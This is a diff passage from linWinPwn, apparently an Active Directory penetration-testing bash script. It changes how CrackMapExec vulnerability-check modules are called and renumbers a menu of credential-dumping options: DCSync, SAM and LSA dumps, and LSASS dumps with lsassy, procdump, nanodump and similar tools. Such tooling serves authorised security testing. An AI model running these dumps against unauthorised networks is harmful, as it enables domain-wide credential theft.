+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_dc_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1290,14 +1304,14 @@ ms17-010_check () {
         ms17-010_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
 
 spooler_check_dc () {
     echo -e "${BLUE}[*] Print Spooler check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_dc_output_${dc_domain}.txt 2>&1      
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_dc_output_${dc_domain}.txt 2>&1      
     echo -e ""
 }
 
@@ -1308,14 +1322,14 @@ spooler_check () {
        spooler_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
     fi
     echo -e ""
 }
 
 webdav_check_dc () {
     echo -e "${BLUE}[*] WebDAV check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_dc_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_dc_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1326,14 +1340,14 @@ webdav_check () {
         webdav_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
 
 shadowcoerce_check_dc () {
     echo -e "${BLUE}[*] shadowcoerce check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_dc_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_dc_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1344,7 +1358,7 @@ shadowcoerce_check () {
         shadowcoerce_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
@@ -1360,7 +1374,7 @@ smbsigning_check () {
 
 ntlmv1_check_dc () {
     echo -e "${BLUE}[*] ntlmv1 check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_dc_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_dc_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1371,14 +1385,14 @@ ntlmv1_check () {
         ntlmv1_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
 
 runasppl_check_dc () {
     echo -e "${BLUE}[*] runasppl check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_dc_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_dc_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1389,7 +1403,7 @@ runasppl_check () {
         runasppl_check_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
@@ -2030,30 +2044,32 @@ pwd_menu () {
     echo -e "1) LAPS Dump"
     echo -e "2) gMSA Dump"
     echo -e "3) DCSync using secretsdump"
-    echo -e "4) Dump SAM from DC using crackmapexec"
-    echo -e "5) Dump SAM from all domain servers using crackmapexec"
-    echo -e "6) Dump SAM from custom list of servers using crackmapexec"
-    echo -e "7) Dump LSA secrets from DC using crackmapexec"
-    echo -e "8) Dump LSA secrets from all domain servers using crackmapexec"
-    echo -e "9) Dump LSA secrets from custom list of servers using crackmapexec"
-    echo -e "10) Dump LSASS from DC using lsassy"
-    echo -e "11) Dump LSASS from all domain servers using lsassy"
-    echo -e "12) Dump LSASS from custom list of servers using lsassy"
-    echo -e "13) Dump LSASS from DC using handlekatz"
-    echo -e "14) Dump LSASS from all domain servers using handlekatz"
-    echo -e "15) Dump LSASS from custom list of servers using handlekatz"
-    echo -e "16) Dump LSASS from DC using procdump"
-    echo -e "17) Dump LSASS from all domain servers using procdump"
-    echo -e "18) Dump LSASS from custom list of servers using procdump"
-    echo -e "19) Dump LSASS from DC using nanodump"
-    echo -e "20) Dump LSASS from all domain servers using nanodump"
-    echo -e "21) Dump LSASS from custom list of servers using nanodump"
-    echo -e "22) Dump LSASS from DC using masky (ADCS required)"
-    echo -e "23) Dump LSASS from all domain servers using masky (ADCS required)"
-    echo -e "24) Dump LSASS from custom list of servers using masky (ADCS required)"
-    echo -e "25) Dump secrets using DonPAPI from DC"
-    echo -e "26) Dump secrets using DonPAPI from all domain servers"
-    echo -e "27) Dump secrets using DonPAPI from custom list of servers"
+    echo -e "4) secretsdump on all domain servers"
+    echo -e "5) secretsdump on custom list of servers"
+    echo -e "6) Dump SAM from DC using crackmapexec"
+    echo -e "7) Dump SAM from all domain servers using crackmapexec"
+    echo -e "8) Dump SAM from custom list of servers using crackmapexec"
+    echo -e "9) Dump LSA secrets from DC using crackmapexec"
+    echo -e "10) Dump LSA secrets from all domain servers using crackmapexec"
+    echo -e "11) Dump LSA secrets from custom list of servers using crackmapexec"
+    echo -e "12) Dump LSASS from DC using lsassy"
+    echo -e "13) Dump LSASS from all domain servers using lsassy"
+    echo -e "14) Dump LSASS from custom list of servers using lsassy"
+    echo -e "15) Dump LSASS from DC using handlekatz"
+    echo -e "16) Dump LSASS from all domain servers using handlekatz"
+    echo -e "17) Dump LSASS from custom list of servers using handlekatz"
+    echo -e "18) Dump LSASS from DC using procdump"
+    echo -e "19) Dump LSASS from all domain servers using procdump"
+    echo -e "20) Dump LSASS from custom list of servers using procdump"
+    echo -e "21) Dump LSASS from DC using nanodump"
+    echo -e "22) Dump LSASS from all domain servers using nanodump"
+    echo -e "23) Dump LSASS from custom list of servers using nanodump"
+    echo -e "24) Dump LSASS from DC using masky (ADCS required)"
+    echo -e "25) Dump LSASS from all domain servers using masky (ADCS required)"
+    echo -e "26) Dump LSASS from custom list of servers using masky (ADCS required)"
+    echo -e "27) Dump secrets using DonPAPI from DC"
+    echo -e "28) Dump secrets using DonPAPI from all domain servers"
+    echo -e "29) Dump secrets using DonPAPI from custom list of servers"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2081,17 +2097,33 @@ pwd_menu () {
         ;;
 
         4)
+        allservers_bool=true
+        secrets_dump
+        pwd_menu
+        ;;
+        
+        5)
+        allservers_bool=false
+        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
+            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
+            read -p ">> " servers_list </dev/tty
+        fi
+        secrets_dump
+        pwd_menu
+        ;;
+
+        6)
         sam_dump_dc
         pwd_menu
         ;;
 
-        5)
+        7)
         allservers_bool=true
         sam_dump
         pwd_menu
         ;;
         
-        6)
+        8)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
@@ -2101,81 +2133,81 @@ pwd_menu () {
         pwd_menu
         ;;
 
-        7)
+        9)
         lsa_dump_dc
         pwd_menu
         ;;
 
-        8)
+        10)
         allservers_bool=true
         lsa_dump
-        pwd_menu
-        ;;
-
-        9)
-        allservers_bool=false
-        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
-            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
-            read -p ">> " servers_list </dev/tty
-        fi
-        lsa_dump
-        pwd_menu
-        ;;
-
-        10)
-        lsassy_dump_dc
         pwd_menu
         ;;
 
         11)
-        allservers_bool=true
-        pwd_menu
-        lsassy_dump
-        ;;
-
-        12)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
             read -p ">> " servers_list </dev/tty
         fi
-        lsassy_dump
+        lsa_dump
+        pwd_menu
+        ;;
+
+        12)
+        lsassy_dump_dc
         pwd_menu
         ;;
 
         13)
+        allservers_bool=true
+        pwd_menu
+        lsassy_dump
+        ;;
+
+        14)
+        allservers_bool=false
+        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
+            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
+            read -p ">> " servers_list </dev/tty
+        fi
+        lsassy_dump
+        pwd_menu
+        ;;
+
+        15)
         handlekatz_dump_dc
         pwd_menu
         ;;
 
-        14)
+        16)
         allservers_bool=true
         pwd_menu
         handlekatz_dump
         ;;
 
-        15)
+        17)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
             read -p ">> " servers_list </dev/tty
         fi
         handlekatz_dump
-        pwd_menu
-        ;;
-
-        16)
-        procdump_dump_dc
-        pwd_menu
-        ;;
-
-        17)
-        allservers_bool=true
-        procdump_dump
         pwd_menu
         ;;
 
         18)
+        procdump_dump_dc
+        pwd_menu
+        ;;
+
+        19)
+        allservers_bool=true
+        procdump_dump
+        pwd_menu
+        ;;
+
+        20)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
@@ -2185,39 +2217,39 @@ pwd_menu () {
         pwd_menu
         ;;
 
-        19)
+        21)
         nanodump_dump_dc
         pwd_menu
         ;;
 
-        20)
+        22)
         allservers_bool=true
         nanodump_dump
-        pwd_menu
-        ;;
-
-        21)
-        allservers_bool=false
-        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
-            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
-            read -p ">> " servers_list </dev/tty
-        fi
-        nanodump_dump
-        pwd_menu
-        ;;
-
-        22)
-        masky_dump_dc
         pwd_menu
         ;;
 
         23)
+        allservers_bool=false
+        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
+            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
+            read -p ">> " servers_list </dev/tty
+        fi
+        nanodump_dump
+        pwd_menu
+        ;;
+
+        24)
+        masky_dump_dc
+        pwd_menu
+        ;;
+
+        25)
         allservers_bool=true
         masky_dump
         pwd_menu
         ;;
 
-        24)
+        26)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
@@ -2227,18 +2259,18 @@ pwd_menu () {
         pwd_menu
         ;;
 
-        25)
+        27)
         donpapi_dump_dc
         pwd_menu
         ;;
 
-        26)
+        28)
         allservers_bool=true
         donpapi_dump
         pwd_menu
         ;;
 
-        27)
+        29)
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ] ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
@@ -2331,8 +2363,8 @@ config_menu () {
         ;;
 
         4)
-        echo -e "" | sudo tee -a /etc/hosts
-        echo -e "${dc_ip}\t${dc_domain}" | sudo tee -a /etc/hosts
+        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
+        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN}" | sudo tee -a /etc/hosts
         echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
         config_menu
         ;;
